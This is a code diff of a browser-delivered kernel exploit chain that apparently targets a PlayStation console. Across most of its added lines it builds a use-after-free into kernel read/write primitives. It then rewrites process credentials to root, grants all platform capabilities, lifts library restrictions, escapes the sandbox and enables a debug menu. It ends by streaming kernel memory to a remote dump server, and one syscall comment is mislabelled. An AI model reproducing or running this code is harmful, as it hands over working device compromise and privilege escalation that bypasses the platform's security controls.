@@ -265,6 +265,22 @@ function setupRW() {
 			master_b[1] = og_slave_addr.hi;
 			return r;
 		},
+		read2: function(addr) {
+			master_b[0] = addr.low;
+			master_b[1] = addr.hi;
+			var r = slave_b[0] & 0xFFFF0000;
+			master_b[0] = og_slave_addr.low;
+			master_b[1] = og_slave_addr.hi;
+			return r;
+		},
+		read1: function(addr) {
+			master_b[0] = addr.low;
+			master_b[1] = addr.hi;
+			var r = slave_b[0] & 0xFFFFFF00;
+			master_b[0] = og_slave_addr.low;
+			master_b[1] = og_slave_addr.hi;
+			return r;
+		},
 		leakval: function(val) {
 			g_ab_slave.leakme = val;
 			master_b[0] = g_jsview_butterfly.low32() - 0x10;
@@ -739,11 +755,12 @@ function stage2() {
   //alert("before syscalls");
 
 //0.85.070
-  window.syscalls[3] = window.libKernelBase.add32(0x322d0);//read
+  window.syscalls[3] = window.libKernelBase.add32(0x322d0);//write
   window.syscalls[4] = window.libKernelBase.add32(0x30c90);//write
   window.syscalls[5] = window.libKernelBase.add32(0x300d0);//open
   window.syscalls[20] = window.libKernelBase.add32(0x31c30);//getpid
   window.syscalls[23] = window.libKernelBase.add32(0x2fd50);//setuid
+  window.syscalls[0x18] = window.libKernelBase.add32(0x31070); // sys_getuid
   window.syscalls[54] = window.libKernelBase.add32(0x30110);//ioctl
   window.syscalls[74] = window.libKernelBase.add32(0x30660);//mprotect
   window.syscalls[97] = window.libKernelBase.add32(0x32100);//socket
@@ -754,6 +771,8 @@ function stage2() {
   window.syscalls[477] = window.libKernelBase.add32(0x2ffd0);//mmap
   window.syscalls[533] = window.libKernelBase.add32(0x32310);//jitshm_create
   window.syscalls[534] = window.libKernelBase.add32(0x322f0);//jitshm_alias
+  window.syscalls[0x2AF] = window.libKernelBase.add32(0x31fc0);//pipe2
+  window.syscalls[0x249]  = window.libKernelBase.add32(0x2fb60); // sys_is_in_sandbox
   //alert("after syscalls");
 
   p.write8(kstr, orig_kview_buf);
@@ -810,6 +829,11 @@ function stage3() {
   
   let dump_sock_fd = chain.syscall(0x061, AF_INET, SOCK_STREAM, 0);
   //alert("opened dump sock=0x" + dump_sock_fd);
+  
+    // Create pipe pair and ultimate r/w prims
+  let pipe_mem = p.malloc(8);
+
+  chain.syscall(0x2AF, pipe_mem, 0); // pipe2
 
   const size_of_triggered = 0x8;
   const size_of_valid_pktopts = 0x18;
@@ -1142,7 +1166,7 @@ function stage3() {
   function ipv6_kread(addr, buffer)
   {
     write_to_victim(addr);
-    chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, buffer, 0x14);
+    chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, buffer, pktinfo_buffer_len);
     chain.run();
   }
 
@@ -1157,17 +1181,68 @@ function stage3() {
     ipv6_kread(addr, ipv6_scratch_buf);
     return p.read8(ipv6_scratch_buf);
   }
+  
+  
+    function brute_force_kernel_map() {
+	kernel_base = new int64(0x80200000, 0xFFFFFFFF);//static
+  }
 
-  // Create pipe pair and ultimate r/w prims
-  let pipe_mem = p.malloc(8);
+  function find_proc() {
+    var proc = ipv6_kread8(kernel_base.add32(KERNEL_ALLPROC_OFFSET));
+    while (proc.low != 0) {
+      var pid = ipv6_kread8(proc.add32(PROC_PID_OFFSET));
+      if (pid.low == this_pid) {
+        return proc;
+      }
+      proc = ipv6_kread8(proc);
+    }
+    alert("[ERROR] failed to find proc REBOOT");
+    while (1) {};
+  }
 
-  chain.syscall(0x2AF, pipe_mem, 0); // pipe2
+  function find_execution_socket() {
 
+    var filedesc = ipv6_kread8(proc.add32(PROC_FILEDESC_OFFSET));
+    var ofiles = ipv6_kread8(filedesc);
+    target_file = ipv6_kread8(ofiles.add32(0x8 * target_socket))
+    socketops = ipv6_kread8(target_file.add32(FILE_FOPS_OFFSET));
+  }
+  //lower priority
+  p.write4(prio, 0x1FF);
+  chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
+  //find uaf
+  find_socket_overlap();
+  //play with uaf
+  //alert("play");
+  fake_pktopts(0);
+  leak_sockets[overlapped_socket_idx] = spare_socket;
+  //leak shit
+  //alert("leak");
+  leak_pktopts();
+  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
+  //alert("find victim");
+  find_slave();
+  brute_force_kernel_map();
+  const proc = find_proc();
+  //alert("here we go!");
+  const proc_ucred = ipv6_kread8(proc.add32(PROC_UCRED_OFFSET));
+  const proc_fd = ipv6_kread8(proc.add32(PROC_FILEDESC_OFFSET));
+
+
+
+  let ofiles_addr         = ipv6_kread8(proc_fd.add32(0x00));
+  //alert("ofiles_addr: " + ofiles_addr);
+  ofiles_addr.add32inplace(0x08); // account for fdt_nfiles
   let pipe_read           = p.read4(pipe_mem);
+  //alert("pipe_read: " + pipe_read);
   let pipe_write          = p.read4(pipe_mem.add32(0x4));
+  //alert("pipe_write: " + pipe_write);
   let pipe_filedescent    = ofiles_addr.add32(pipe_read * 0x30);
   let pipe_file           = ipv6_kread8(pipe_filedescent);
+  //alert("pipe_file: " + pipe_file);
   let pipe_addr           = ipv6_kread8(pipe_file);
+  //alert("pipe_addr: " + pipe_addr);
+  let pipemap_buffer	  = malloc(0x14);
 
   function copyout(src, dest, length) {
     if (typeof copyout.value == 'undefined') {
@@ -1251,50 +1326,7 @@ function stage3() {
    * End specter's edits for pipe-based R/W
    */
 
-  function brute_force_kernel_map() {
-	kernel_base = new int64(0x80200000, 0xFFFFFFFF);//static
-  }
 
-  function find_proc() {
-    var proc = kernel_read8(kernel_base.add32(KERNEL_ALLPROC_OFFSET));
-    while (proc.low != 0) {
-      var pid = kernel_read8(proc.add32(PROC_PID_OFFSET));
-      if (pid.low == this_pid) {
-        return proc;
-      }
-      proc = kernel_read8(proc);
-    }
-    alert("[ERROR] failed to find proc REBOOT");
-    while (1) {};
-  }
-
-  function find_execution_socket() {
-
-    var filedesc = kernel_read8(proc.add32(PROC_FILEDESC_OFFSET));
-    var ofiles = kernel_read8(filedesc);
-    target_file = kernel_read8(ofiles.add32(0x8 * target_socket))
-    socketops = kernel_read8(target_file.add32(FILE_FOPS_OFFSET));
-  }
-  //lower priority
-  p.write4(prio, 0x1FF);
-  chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
-  //find uaf
-  find_socket_overlap();
-  //play with uaf
-  //alert("play");
-  fake_pktopts(0);
-  leak_sockets[overlapped_socket_idx] = spare_socket;
-  //leak shit
-  //alert("leak");
-  leak_pktopts();
-  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
-  //alert("find victim");
-  find_slave();
-  brute_force_kernel_map();
-  const proc = find_proc();
-  //alert("here we go!");
-  const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
-  const proc_fd = kernel_read8(proc.add32(PROC_FILEDESC_OFFSET));
   
   
   // dump code (slow) - specter
@@ -1350,60 +1382,85 @@ function stage3() {
 	//CORRECT SUPPOSED SECURITY FLAGS
 	17 00 00 00 00 00 00 01
   */
-  alert("before:");
-  alert("qaf: " + kernel_read8(kernel_base.add32(QAF_OFFSET)));
-  alert("utf: " + kernel_read8(kernel_base.add32(UTF_OFFSET)));
-  alert("sff: " + kernel_read8(kernel_base.add32(SFF_OFFSET)));
-  
-  alert("cr_uid cr_ruid : " + kernel_read8(proc_ucred.add32(0x4)));
-  alert("cr_svuid cr_ngroups : " + kernel_read8(proc_ucred.add32(0xC)));
-  //alert("cr_prison: " + kernel_read8(proc_ucred.add32(0x30)));
   alert("authid: "  + kernel_read8(proc_ucred.add32(0x58)));
-  alert("cr_caps: " + kernel_read8(proc_ucred.add32(0x60)));
-  alert("cr_caps: " + kernel_read8(proc_ucred.add32(0x68)));
-  alert("fd_rdir: " + kernel_read8(proc_fd.add32(0x10)));
-  alert("fd_jdir: " + kernel_read8(proc_fd.add32(0x18)));
+  
+	function get_kaddr(offset) {
+        return kernel_base.add32(offset);
+    }
+  
+	// Set security flags
+	let security_flags =  kernel_read4(get_kaddr(SFF_OFFSET));
+	 kernel_write4(get_kaddr(SFF_OFFSET), security_flags | 0x14);
+
+	// Set qa flags and utoken flags for debug menu enable
+	let qaf_dword =  kernel_read4(get_kaddr(QAF_OFFSET));
+	 kernel_write4(get_kaddr(QAF_OFFSET), qaf_dword | 0x10300);
+
+	let utoken_flags =  kernel_read1(get_kaddr(UTF_OFFSET));
+	 kernel_write1(get_kaddr(UTF_OFFSET), utoken_flags | 0x1);
+	debug_log("[+] enabled debug menu");
+
+	 kernel_write4(proc_ucred.add32(0x04), 0); // cr_uid
+	 kernel_write4(proc_ucred.add32(0x08), 0); // cr_ruid
+	 kernel_write4(proc_ucred.add32(0x0C), 0); // cr_svuid
+	 kernel_write4(proc_ucred.add32(0x10), 1); // cr_ngroups
+	 kernel_write4(proc_ucred.add32(0x14), 0); // cr_rgid
+
+	// Escalate sony privs
+	 kernel_write8(proc_ucred.add32(0x58), new int64(0x00000010, 0x48000000)); // cr_sceAuthId
+	 kernel_write8(proc_ucred.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
+	 kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
+	 kernel_write1(proc_ucred.add32(0x83), 0x80);                              // cr_sceAttr[0]
+	
+	// Remove dynlib restriction
+    let proc_pdynlib_offset = proc.add32(0x3E8);
+    let proc_pdynlib_addr = kernel_read8(proc_pdynlib_offset);
+
+    let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
+    kernel_write4(restrict_flags_addr, 0);
+
+    let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
+    kernel_write8(libkernel_ref_addr, new int64(1, 0));
+	
+	let cur_uid = chain.syscall(0x018);
+    alert("[+] we root now? uid=0x" + cur_uid);
+	
+	let rootvnode =  kernel_read8(get_kaddr(ROOTVNODE_OFFSET));
+     kernel_write8(proc_fd.add32(0x10), rootvnode); // fd_rdir
+     kernel_write8(proc_fd.add32(0x18), rootvnode); // fd_jdir
+	 
+	let is_in_sandbox = chain.syscall(0x249);
+    debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);
   
 
+	alert("authid: " + kernel_read8(proc_ucred.add32(0x58)));
   
-  //patch flags and tokens
-  kernel_write8(kernel_base.add32(QAF_OFFSET), new int64(0x01030000, 0x00000000));
-  kernel_write8(kernel_base.add32(UTF_OFFSET), new int64(0x00000001, 0x00000000));
-  kernel_write8(kernel_base.add32(SFF_OFFSET), new int64(0x00000017, 0x01000000, ));
-  
-  //rootvnode shit
-  let rootvnode_area_store = kernel_read8(kernel_base.add32(ROOTVNODE_OFFSET));
-  let prison_store		   = kernel_read8(kernel_base.add32(PRISON_OFFSET));
-  
-  // Patch creds
-  kernel_write8(proc_ucred.add32(0x04), new int64(0x00000000, 0x00000000));// cr_uid 0 cr_ruid 0
-  kernel_write8(proc_ucred.add32(0x0C), new int64(0x00000001, 0x00000000));// cr_svuid 0 cr_ngroups 1
-  kernel_write8(proc_ucred.add32(0x58), new int64(0x00000010, 0x48000000));//checked, cr_sceAuthID
-  kernel_write8(proc_ucred.add32(0x60), new int64(0xffffffff, 0xffffffff));//checked, cr_sceCaps[0]
-  kernel_write8(proc_ucred.add32(0x68), new int64(0xffffffff, 0xffffffff));//checked, cr_sceCaps[1]
-  
+  let dump_addr = get_kaddr(0x1526600);
+  let dump_page = p.malloc(0x1000);
 
-  // Escape sandbox
-  kernel_write8(proc_fd.add32(0x10), rootvnode_area_store);  // fd_rdir
-  kernel_write8(proc_fd.add32(0x18), rootvnode_area_store);  // fd_jdir
-  
-  alert("qaf: " + kernel_read8(kernel_base.add32(QAF_OFFSET)));
-  alert("utf: " + kernel_read8(kernel_base.add32(UTF_OFFSET)));
-  alert("sff: " + kernel_read8(kernel_base.add32(SFF_OFFSET)));
-  
-  alert("cr_uid 0 cr_ruid 0: " + kernel_read8(proc_ucred.add32(0x4)));
-  alert("cr_svuid 0 cr_ngroups 1: " + kernel_read8(proc_ucred.add32(0xC)));
-  alert("authid: " + kernel_read8(proc_ucred.add32(0x58)));
-  alert("cr_caps all ff: " + kernel_read8(proc_ucred.add32(0x60)));
-  alert("cr_caps all ff: " + kernel_read8(proc_ucred.add32(0x68)));
-  alert("fd_rdir: " + kernel_read8(proc_fd.add32(0x10)));
-  alert("fd_jdir: " + kernel_read8(proc_fd.add32(0x18)));
-  
-  
-  
+  alert("about to dump kernel (0x" + dump_addr + "), ensure dump server is running (" + DUMP_NET_IP + ":5656)...");
 
-  let buf = p.malloc(0x1000);
-  let fd = chain.syscall(0x005,"/dev/da0x12.crypt", 0);//open O_RDONLY
+  let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);
+  alert("connected dump sock? 0x" + connect_res);
+
+  for (let pfn = 0; ; pfn++) {
+    for (let off = 0; off < 0x1000; off += 0x8) {
+      let qword = kernel_read8(dump_addr.add32((pfn * 0x1000) + off));
+      p.write8(dump_page.add32(off), qword);
+    }
+
+    
+    let write_res = chain.syscall(0x004, dump_sock_fd, dump_page, 0x1000);
+    if (pfn == 0)
+      alert("first page written? 0x" + write_res);
+  }
+
+  // end dump code
+  
+  /*
+
+  let buf = p.malloc(0x200);
+  let fd = chain.syscall(0x005,"/dev/sflash0s1.cryptx3b", 0);//open O_RDONLY
   if(fd.low == 0xffffffff){
     alert("failed to open, error -1");
   }
@@ -1415,7 +1472,7 @@ function stage3() {
   alert("connected dump sock? 0x" + connect_res);
 
   for (let pfn = 0; ; pfn++) {
-      let read = chain.syscall(0x003, fd, buf, 0x1000);//read
+      let read = chain.syscall(0x003, fd, buf, 0x200);//read
     let write = chain.syscall(0x004, dump_sock_fd, buf, read);//write
     
   if(pfn == 0){  
@@ -1437,6 +1494,8 @@ function stage3() {
     }
   }
   }
+*/
+
 
   // end dump code
   
